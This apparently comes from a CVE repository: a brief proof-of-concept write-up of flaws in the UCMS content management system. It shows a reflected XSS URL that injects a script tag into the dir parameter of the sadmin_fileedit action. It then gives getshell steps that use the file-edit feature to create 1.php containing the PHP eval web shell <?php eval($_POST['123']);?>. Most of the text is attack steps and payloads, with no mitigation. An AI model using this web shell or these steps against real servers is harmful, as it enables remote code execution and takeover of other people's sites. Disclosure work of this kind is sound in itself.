# XSS1
Access URL：http://www.a.com:85/ucms/index.php?do=sadmin_fileedit&dir=/ucms/user/%3Cscript%3Ealert(1)%3C/script%3E&file=mypost.php
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_xss_1-1.png)

-------------------------------------------
# GETSHELL
Create a 1.php file and submit
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_getshell_1-1.png)

Write poc：
`<?php eval($_POST['123']);?>`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_getshell_1-2.png)

Getshell
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_getshell_1-3.png)
